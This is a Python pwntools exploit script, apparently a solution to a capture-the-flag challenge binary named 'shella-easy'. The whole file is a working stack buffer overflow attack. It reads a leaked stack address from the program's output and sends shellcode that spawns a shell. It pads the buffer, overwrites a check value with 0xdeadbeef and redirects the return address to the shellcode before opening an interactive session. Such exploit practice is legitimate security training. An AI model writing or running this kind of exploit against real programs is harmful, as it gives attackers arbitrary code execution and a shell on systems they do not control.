```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'shella-easy')

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''

io = start()

line = io.recvline().decode().strip()
line = line.replace("Yeah I'll have a ", "").replace(" with a side of fries thanks", "").strip()
shelladr = int(line, 16)

shellcode = asm(shellcraft.sh())
payload = shellcode
padding_length = 0x40 - len(payload)
payload += b"\x00" * padding_length
payload += p32(0xdeadbeef)
payload += b"\x01" * 8
payload += p32(shelladr)

io.send(payload)
io.interactive()
```
